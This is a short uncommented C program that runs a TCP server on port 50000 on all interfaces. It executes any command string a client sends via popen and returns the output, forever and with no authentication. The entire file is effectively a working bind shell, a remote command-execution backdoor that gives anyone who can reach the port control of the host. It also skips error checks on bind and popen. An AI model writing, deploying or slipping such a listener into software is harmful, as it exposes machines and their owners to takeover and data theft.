#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#define MAX_LENGTH 1024


int main(int argc, char**argv){
    char cmdstring[MAX_LENGTH];
    char*result;
    FILE*handle=NULL;
    struct sockaddr_in servaddr;
    int listenfd, connfd, n;

    if((listenfd=socket(AF_INET, SOCK_STREAM, 0))<0){
        printf("socket error!");
        exit(1);
    }

    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family=AF_INET;
    servaddr.sin_addr.s_addr=htonl(INADDR_ANY);
    servaddr.sin_port=htons(50000);

    bind(listenfd, (struct sockaddr*)&servaddr, sizeof(struct sockaddr));
    listen(listenfd, 1024);
    
	for( ; ; )
	{
		connfd = accept( listenfd , (struct sockaddr *)NULL , NULL );
        memset(cmdstring, 0, MAX_LENGTH);
        read(connfd, cmdstring, MAX_LENGTH);
        printf("get command: %s\r\n", cmdstring);
        handle=popen(cmdstring, "r");
        char message[MAX_LENGTH+1]={0};

        while((result=fgets(message, MAX_LENGTH, handle))!=NULL){
            printf("gets: %s", result);
            write(connfd, message, strlen(message));
        }
        printf("execution ends!\r\n\r\n");


        pclose(handle);
		close( connfd );
	} 
    
    exit(0);
}